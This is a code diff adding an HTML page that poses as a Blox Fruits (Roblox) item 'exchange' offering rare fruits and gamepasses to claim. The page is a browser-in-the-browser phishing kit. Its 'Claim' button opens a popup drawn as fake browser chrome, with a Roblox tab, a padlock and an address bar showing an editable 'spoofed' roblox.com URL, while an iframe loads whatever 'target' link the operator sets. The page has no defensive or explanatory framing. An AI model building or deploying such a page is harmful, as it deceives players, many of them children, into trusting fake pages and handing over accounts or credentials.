@@ -1,0 +1,281 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Blox Nebula — Galaxy Exchange Hub</title>
+    <style>
+        :root {
+            --bg-color: #030712;
+            --panel-bg: rgba(15, 23, 42, 0.75);
+            --border-color: rgba(59, 130, 246, 0.25);
+            --text-primary: #f8fafc;
+            --text-secondary: #94a3b8;
+            --accent-glow: #3b82f6;
+            --btn-gradient: linear-gradient(135deg, #2563eb 0%, #3b82f6 50%, #6366f1 100%);
+            --btn-hover: linear-gradient(135deg, #1d4ed8 0%, #2563eb 50%, #4f46e5 100%);
+        }
+        body {
+            background: radial-gradient(circle at 50% 0%, #1e1b4b 0%, #0f172a 50%, #030712 100%);
+            color: var(--text-primary);
+            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
+            margin: 0;
+            padding: 40px 20px;
+            min-height: 100vh;
+        }
+        header { text-align: center; margin-bottom: 40px; }
+        h1 {
+            font-size: 2.8rem;
+            margin-bottom: 10px;
+            background: linear-gradient(135deg, #60a5fa, #9333ea, #3b82f6);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            text-shadow: 0 0 40px rgba(59, 130, 246, 0.4);
+        }
+        p.subtitle { color: var(--text-secondary); font-size: 1.1rem; }
+        .filter-container { display: flex; justify-content: center; gap: 12px; margin-bottom: 40px; flex-wrap: wrap; }
+        .filter-btn {
+            background: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(10px);
+            color: var(--text-secondary);
+            padding: 10px 20px;
+            border-radius: 10px;
+            cursor: pointer;
+            font-weight: 600;
+            transition: all 0.3s ease;
+        }
+        .filter-btn.active, .filter-btn:hover {
+            background: var(--btn-gradient);
+            color: white;
+            border-color: rgba(96, 165, 250, 0.5);
+            box-shadow: 0 0 20px rgba(59, 130, 246, 0.5);
+        }
+        .grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(260px, 1fr));
+            gap: 24px;
+            max-width: 1300px;
+            margin: 0 auto;
+        }
+        .card {
+            background-color: var(--panel-bg);
+            border: 1px solid var(--border-color);
+            backdrop-filter: blur(12px);
+            border-radius: 16px;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            justify-content: space-between;
+            transition: transform 0.3s ease, border-color 0.3s ease, box-shadow 0.3s ease;
+        }
+        .card:hover {
+            transform: translateY(-6px);
+            border-color: rgba(96, 165, 250, 0.6);
+            box-shadow: 0 12px 30px rgba(37, 99, 235, 0.25);
+        }
+        .card img {
+            width: 85px;
+            height: 85px;
+            object-fit: contain;
+            margin: 0 auto 15px auto;
+            border-radius: 12px;
+            background: rgba(30, 58, 138, 0.2);
+            padding: 8px;
+            border: 1px solid rgba(59, 130, 246, 0.2);
+        }
+        .card h3 { margin: 0 0 4px 0; font-size: 1.05rem; color: #ffffff; text-align: center; }
+        .category-tag { font-size: 0.75rem; text-transform: uppercase; letter-spacing: 1px; color: #60a5fa; margin-bottom: 12px; font-weight: 700; text-align: center; }
+        .link-config { background: rgba(3, 7, 18, 0.5); padding: 10px; border-radius: 8px; border: 1px solid rgba(59, 130, 246, 0.15); margin-bottom: 12px; }
+        .link-config label { display: block; font-size: 0.65rem; color: var(--text-secondary); text-transform: uppercase; margin-bottom: 3px; font-weight: bold; letter-spacing: 0.5px; }
+        .link-config input {
+            width: 100%;
+            padding: 6px 8px;
+            background: #020617;
+            border: 1px solid #1e3a8a;
+            color: #e2e8f0;
+            border-radius: 4px;
+            font-size: 0.75rem;
+            box-sizing: border-box;
+            font-family: monospace;
+            margin-bottom: 6px;
+        }
+        .link-config input:focus { border-color: #3b82f6; outline: none; box-shadow: 0 0 8px rgba(59, 130, 246, 0.4); }
+        .btn {
+            background: var(--btn-gradient);
+            color: white;
+            border: none;
+            padding: 11px;
+            font-size: 0.95rem;
+            font-weight: 700;
+            border-radius: 8px;
+            cursor: pointer;
+            width: 100%;
+            transition: all 0.2s ease;
+            box-shadow: 0 4px 15px rgba(37, 99, 235, 0.3);
+        }
+        .btn:hover { background: var(--btn-hover); transform: scale(1.02); box-shadow: 0 6px 20px rgba(59, 130, 246, 0.5); }
+    </style>
+</head>
+<body>
+    <header>
+        <h1>Blox Nebula Galaxy Exchange</h1>
+        <p class="subtitle">Blue Galaxy Theme — Configure your Spoofed URL and Target Link.</p>
+    </header>
+    <div class="filter-container">
+        <button class="filter-btn active" onclick="filterItems('all', event)">All Items</button>
+        <button class="filter-btn" onclick="filterItems('Permanent', event)">Permanent Fruits</button>
+        <button class="filter-btn" onclick="filterItems('Mutation', event)">Rare Mutations</button>
+        <button class="filter-btn" onclick="filterItems('Gamepass', event)">Gamepasses</button>
+        <button class="filter-btn" onclick="filterItems('Physical', event)">Rare Physicals</button>
+    </div>
+    <div class="grid" id="itemGrid"></div>
+    <script>
+        const inventory = [
+            { name: "Galaxy Kitsune (Perm)", category: "Mutation", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/c/c9/Kitsune.png", spoofed: "https://roblox.com/games/33215442/Galaxy-Kitsune-Event", url: "https://www.roblox.com" },
+            { name: "Ember Dragon (Perm)", category: "Mutation", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/4/41/Dragon.png", spoofed: "https://roblox.com/games/33215442/Ember-Dragon-Event", url: "https://www.roblox.com" },
+            { name: "Empyrean Kitsune (Perm)", category: "Mutation", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/c/c9/Kitsune.png", spoofed: "https://roblox.com/games/33215442/Empyrean-Kitsune", url: "https://www.roblox.com" },
+            { name: "Kitsune (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/c/c9/Kitsune.png", spoofed: "https://roblox.com/games/33215442/Kitsune-Perm", url: "https://www.roblox.com" },
+            { name: "Dragon (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/4/41/Dragon.png", spoofed: "https://roblox.com/games/33215442/Dragon-Perm", url: "https://www.roblox.com" },
+            { name: "Leopard (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/6/63/Leopard.png", spoofed: "https://roblox.com/games/33215442/Leopard-Perm", url: "https://www.roblox.com" },
+            { name: "Dough (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/2/22/Dough.png", spoofed: "https://roblox.com/games/33215442/Dough-Perm", url: "https://www.roblox.com" },
+            { name: "T-Rex (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/3/36/T-Rex.png", spoofed: "https://roblox.com/games/33215442/T-Rex-Perm", url: "https://www.roblox.com" },
+            { name: "Mammoth (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/e/e9/Mammoth.png", spoofed: "https://roblox.com/games/33215442/Mammoth-Perm", url: "https://www.roblox.com" },
+            { name: "Spirit (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/b/b5/Spirit.png", spoofed: "https://roblox.com/games/33215442/Spirit-Perm", url: "https://www.roblox.com" },
+            { name: "Control (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/e/ea/Control.png", spoofed: "https://roblox.com/games/33215442/Control-Perm", url: "https://www.roblox.com" },
+            { name: "Venom (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/8/87/Venom.png", spoofed: "https://roblox.com/games/33215442/Venom-Perm", url: "https://www.roblox.com" },
+            { name: "Shadow (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/7/7b/Shadow.png", spoofed: "https://roblox.com/games/33215442/Shadow-Perm", url: "https://www.roblox.com" },
+            { name: "Blizzard (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/4/44/Blizzard.png", spoofed: "https://roblox.com/games/33215442/Blizzard-Perm", url: "https://www.roblox.com" },
+            { name: "Portal (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/5/50/Portal.png", spoofed: "https://roblox.com/games/33215442/Portal-Perm", url: "https://www.roblox.com" },
+            { name: "Buddha (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/9/91/Buddha.png", spoofed: "https://roblox.com/games/33215442/Buddha-Perm", url: "https://www.roblox.com" },
+            { name: "Sound (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/6/67/Sound.png", spoofed: "https://roblox.com/games/33215442/Sound-Perm", url: "https://www.roblox.com" },
+            { name: "Phoenix (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/5/5c/Phoenix.png", spoofed: "https://roblox.com/games/33215442/Phoenix-Perm", url: "https://www.roblox.com" },
+            { name: "Pain (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/0/07/Pain.png", spoofed: "https://roblox.com/games/33215442/Pain-Perm", url: "https://www.roblox.com" },
+            { name: "Rumble (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/3/3b/Rumble.png", spoofed: "https://roblox.com/games/33215442/Rumble-Perm", url: "https://www.roblox.com" },
+            { name: "Magma (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/1/1a/Magma.png", spoofed: "https://roblox.com/games/33215442/Magma-Perm", url: "https://www.roblox.com" },
+            { name: "Light (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/5/5c/Light.png", spoofed: "https://roblox.com/games/33215442/Light-Perm", url: "https://www.roblox.com" },
+            { name: "Ice (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/e/e0/Ice.png", spoofed: "https://roblox.com/games/33215442/Ice-Perm", url: "https://www.roblox.com" },
+            { name: "Dark (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/2/27/Dark.png", spoofed: "https://roblox.com/games/33215442/Dark-Perm", url: "https://www.roblox.com" },
+            { name: "Flame (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/d/d3/Flame.png", spoofed: "https://roblox.com/games/33215442/Flame-Perm", url: "https://www.roblox.com" },
+            { name: "Rocket (Perm)", category: "Permanent", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/9/98/Rocket.png", spoofed: "https://roblox.com/games/33215442/Rocket-Perm", url: "https://www.roblox.com" }
+        ];
+        const moreItems = [
+            { name: "+1 Fruit Storage", category: "Gamepass", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/4/45/Fruit_Storage.png", spoofed: "https://roblox.com/games/33215442/Fruit-Storage", url: "https://www.roblox.com" },
+            { name: "Dark Blade", category: "Gamepass", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/0/0c/Dark_Blade.png", spoofed: "https://roblox.com/games/33215442/Dark-Blade", url: "https://www.roblox.com" },
+            { name: "2x Money", category: "Gamepass", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/6/6f/2x_Money.png", spoofed: "https://roblox.com/games/33215442/2x-Money", url: "https://www.roblox.com" },
+            { name: "2x Mastery", category: "Gamepass", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/e/e3/2x_Mastery.png", spoofed: "https://roblox.com/games/33215442/2x-Mastery", url: "https://www.roblox.com" },
+            { name: "Fast Boats", category: "Gamepass", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/d/df/Fast_Boats.png", spoofed: "https://roblox.com/games/33215442/Fast-Boats", url: "https://www.roblox.com" },
+            { name: "Fruit Notifier", category: "Gamepass", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/b/be/Fruit_Notifier.png", spoofed: "https://roblox.com/games/33215442/Fruit-Notifier", url: "https://www.roblox.com" },
+            { name: "2x Boss Drops", category: "Gamepass", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/0/04/Boss_Drop.png", spoofed: "https://roblox.com/games/33215442/Boss-Drops", url: "https://www.roblox.com" },
+            { name: "3x Mythical Scrolls", category: "Physical", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/e/e1/Scroll.png", spoofed: "https://roblox.com/games/33215442/Mythical-Scrolls", url: "https://www.roblox.com" },
+            { name: "5x Legendary Scrolls", category: "Physical", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/e/e1/Scroll.png", spoofed: "https://roblox.com/games/33215442/Legendary-Scrolls", url: "https://www.roblox.com" },
+            { name: "Divine Portal (Physical)", category: "Physical", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/5/50/Portal.png", spoofed: "https://roblox.com/games/33215442/Divine-Portal", url: "https://www.roblox.com" },
+            { name: "Celestial Pain (Physical)", category: "Physical", img: "https://static.wikia.nocookie.net/roblox-blox-fruits/images/0/07/Pain.png", spoofed: "https://roblox.com/games/33215442/Celestial-Pain", url: "https://www.roblox.com" }
+        ];
+        inventory.push(...moreItems);
+
+        function renderGrid(filter = 'all') {
+            const grid = document.getElementById('itemGrid');
+            grid.innerHTML = '';
+            
+            const filtered = filter === 'all' ? inventory : inventory.filter(i => i.category === filter);
+
+            filtered.forEach((item) => {
+                const globalIndex = inventory.indexOf(item);
+                const card = document.createElement('div');
+                card.className = 'card';
+                card.innerHTML = `
+                    <div>
+                        <img src="${item.img}" alt="${item.name}" onerror="this.src='https://via.placeholder.com/80?text=Item'">
+                        <h3>${item.name}</h3>
+                        <div class="category-tag">${item.category}</div>
+
+                        <div class="link-config">
+                            <label>Spoofed URL</label>
+                            <input type="text" id="spoofed-${globalIndex}" value="${item.spoofed}">
+                            
+                            <label>Target URL</label>
+                            <input type="text" id="url-${globalIndex}" value="${item.url}">
+                        </div>
+                    </div>
+                    <button class="btn" onclick="openTab(${globalIndex})">Claim</button>
+                `;
+                grid.appendChild(card);
+            });
+        }
+
+        function filterItems(category, event) {
+            document.querySelectorAll('.filter-btn').forEach(b => b.classList.remove('active'));
+            event.target.classList.add('active');
+            renderGrid(category);
+        }
+
+        function openTab(index) {
+            const spoofedVal = document.getElementById(`spoofed-${index}`).value;
+            const urlVal = document.getElementById(`url-${index}`).value;
+            const itemName = inventory[index].name;
+
+            const tabWindow = window.open("", "_blank", "width=1000,height=750");
+            tabWindow.document.write(`
+                <!DOCTYPE html>
+                <html lang="en">
+                <head>
+                    <meta charset="UTF-8">
+                    <title>${itemName}</title>
+                    <style>
+                        body, html { margin: 0; padding: 0; height: 100%; background: #ffffff; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; display: flex; flex-direction: column; overflow: hidden; }
+                        .browser-header { background: #dee1e6; border-bottom: 1px solid #c4c7cc; display: flex; flex-direction: column; flex-shrink: 0; user-select: none; }
+                        .app-bar { display: flex; align-items: center; justify-content: space-between; padding: 8px 12px; background: #f8f9fa; border-bottom: 1px solid #dadce0; }
+                        .app-bar-left { display: flex; align-items: center; gap: 12px; background: #f1f3f4; padding: 6px 14px; border-radius: 20px; flex-grow: 1; max-width: calc(100% - 80px); font-size: 13px; color: #3c4043; border: 1px solid #dadce0; }
+                        .app-bar-right { display: flex; align-items: center; gap: 16px; color: #3c4043; font-size: 18px; }
+                        .tabs-badge { border: 2px solid #3c4043; border-radius: 4px; font-size: 11px; font-weight: bold; padding: 1px 4px; min-width: 14px; text-align: center; }
+                        .tab-row { display: flex; align-items: center; padding: 6px 8px 0 8px; gap: 4px; background: #dee1e6; }
+                        .browser-tab { background: #ffffff; padding: 7px 14px; border-top-left-radius: 8px; border-top-right-radius: 8px; font-size: 12px; display: flex; align-items: center; gap: 8px; max-width: 220px; border: 1px solid #c4c7cc; border-bottom: none; color: #1f1f1f; font-weight: 500; }
+                        .browser-tab img { width: 14px; height: 14px; object-fit: contain; }
+                        .browser-tab span { white-space: nowrap; overflow: hidden; text-overflow: ellipsis; flex-grow: 1; }
+                        .close-tab { font-size: 14px; color: #595959; cursor: pointer; }
+                        .address-row { display: flex; align-items: center; padding: 6px 12px; background: #ffffff; gap: 10px; border-bottom: 1px solid #e1e3e6; }
+                        .nav-btns { display: flex; gap: 16px; color: #5f6368; font-size: 16px; }
+                        .address-bar { flex-grow: 1; background: #f1f3f4; border-radius: 20px; padding: 6px 16px; display: flex; align-items: center; gap: 8px; font-size: 13px; color: #202124; font-family: system-ui; }
+                        .address-bar span.lock { color: #5f6368; font-size: 12px; }
+                        .address-bar span.url-text { overflow: hidden; text-overflow: ellipsis; white-space: nowrap; color: #202124; }
+                        iframe { flex-grow: 1; border: none; width: 100%; height: calc(100% - 116px); background: #ffffff; }
+                    </style>
+                </head>
+                <body>
+                    <div class="browser-header">
+                        <div class="app-bar">
+                            <div class="app-bar-left">
+                                <span style="font-size: 14px;">🏠</span>
+                                <span style="overflow: hidden; text-overflow: ellipsis; white-space: nowrap;">underratedgalxatic.netlify.app</span>
+                            </div>
+                            <div class="app-bar-right">
+                                <div class="tabs-badge">55</div>
+                                <span>⋮</span>
+                            </div>
+                        </div>
+                        <div class="tab-row">
+                            <div class="browser-tab">
+                                <img src="https://images.rbxcdn.com/3274dc5d962464eed4ec8d42d2a45a30.ico" alt="Roblox">
+                                <span>${itemName}</span>
+                                <span class="close-tab">×</span>
+                            </div>
+                        </div>
+                        <div class="address-row">
+                            <div class="nav-btns"><span>←</span><span>→</span><span>↻</span></div>
+                            <div class="address-bar">
+                                <span class="lock">🔒</span>
+                                <span class="url-text">${spoofedVal}</span>
+                            </div>
+                        </div>
+                    </div>
+                    <iframe src="${urlVal}"></iframe>
+                </body>
+                </html>
+            `);
+        }
+
+        renderGrid('all');
+    </script>
+</body>
+</html>
